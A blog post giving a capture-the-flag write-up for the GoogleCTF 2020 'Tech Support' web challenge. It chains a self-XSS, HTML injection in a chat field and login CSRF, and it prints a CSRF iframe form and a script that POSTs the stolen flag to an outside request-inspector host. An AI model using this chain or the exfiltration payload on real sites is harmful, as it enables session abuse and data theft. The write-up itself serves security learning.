---
layout: post
title: "GoogleCTF Tech Support solution"
date: 2020-08-24
---

The challenge' info card gives us a link to the website.


![infocard](/assets/posts/googleCTF-techsupport/images/p1.PNG)


#### Website's first page:


![firstpage](/assets/posts/googleCTF-techsupport/images/p2.PNG)


After creating and logging in to a new user, the page looks like this:


#### Main page:


![mainpage](/assets/posts/googleCTF-techsupport/images/p3.PNG)


The `/me` page appears immediately after logging in to our user. 

We have the address update functionality on this page, the address is stored within the DOM and we can inject script tags.

When I set the address to `<script>alert()</script>` the tag is stored within the page as follows:


![selfxss-1](/assets/posts/googleCTF-techsupport/images/p4.PNG)


This XSS by itself is not useful, a self XSS, but we should keep it on the mind.

Let's look on the flag page:

#### Flag page:


![flagpage](/assets/posts/googleCTF-techsupport/images/p5.PNG)


Only the `chat` user can access the flag, we should find how to causing the chat user to access some vulnerable page which will fetch the flag page and send its content to our domain.
In order to do so, I sould find a way to communicate the chat user.
The is a chat page in the website.

#### Chat page:


![chatpage](/assets/posts/googleCTF-techsupport/images/p6.PNG)


I can write the chatbot the reason for chatting him, pass the ReCaptcha test and submit it, after submitting the form a chat iframe will pop up, the reason I entered reflected within the chat iframe

#### Chat creation:


![chatcreate](/assets/posts/googleCTF-techsupport/images/p7.PNG)


#### Reason reflection:


![reasonreflection](/assets/posts/googleCTF-techsupport/images/p8.PNG)


The reason isn't encoded or escaped so I'm able to inject tag.
Let's proof this:


![reasonxss](/assets/posts/googleCTF-techsupport/images/p9.PNG)


We can assume that the `chat` user is open the same chat page, so the tag will be injected in its frame also, let's check it with a simple image request to our request inspector domain: 

#### The reason payload:


![reasonpayload](/assets/posts/googleCTF-techsupport/images/p10.PNG)


I received two requests to my request inspector - one from my browser and one from the chat user:

#### Chat user request:


![chatrequest](/assets/posts/googleCTF-techsupport/images/p11.PNG)


The iframe' origin isn't the same as the main website, so we can't just steal the flag by exploiting the XSS.

The chat URL is `//typeselfsub-support.web.ctfcompetition.com/static/chat.html`

The flag URL is `https://typeselfsub.web.ctfcompetition.com/flag`

The SOP will prevent us from reading data between these two origins. We should find a way to exploit the self XSS we found on the `/me` page to receive the flag.

Remember the self XSS? The login page is vulnerable to CSRF, it sends an empty CSRF token. We can create a page that exploits this and redirects to the `/me` page which contains the stored self XSS payload.

```
<iframe srcdoc='
            <form class="form" action="https://typeselfsub.web.ctfcompetition.com/login" method="POST">
              <input class="form-control" autofocus="" type="text" id="username" name="username" value="om3r-v">
              <input class="form-control" type="password" id="password" name="password" value="1234">
              <input type="hidden" name="csrf" value="">
          </form>
          <script>
              document.forms[0].submit()
            </script>
'>
</iframe>
```

#### The result:


![exploitingselfXSS](/assets/posts/googleCTF-techsupport/images/p12.PNG)


To receive the flag, we should create another iframe with the flag source.

Each iframe can access the DOM of the other iframe because their origins are the same.

#### Illustration:


![illustration](/assets/posts/googleCTF-techsupport/images/p13.png)


The self XSS payload within the `/me` page is:

``` 
<script> 
fetch("https://requestinspector.com/inspect/01ek2nd2b5agjbgk4j7yh6spyb" , {"method":"POST", "body": parent.x.window.flag.innerText})
</script>
```

This script tag will be executed within an iframe and it sends a POST request to my request inspector domain, the request' body is the content of the flag which is located in an iframe. 

My malicious website source is :


![maliciousweb](/assets/posts/googleCTF-techsupport/images/p14.PNG)


To exploit this XSS with my malicious website, I should send it to the chat user using the HTML injection we found at the chat creation.
We will pass the malicious website as an iframe:


![pass the website](/assets/posts/googleCTF-techsupport/images/p15.PNG)


#### Receiving the flag:


![receiveflag](/assets/posts/googleCTF-techsupport/images/p16.PNG)


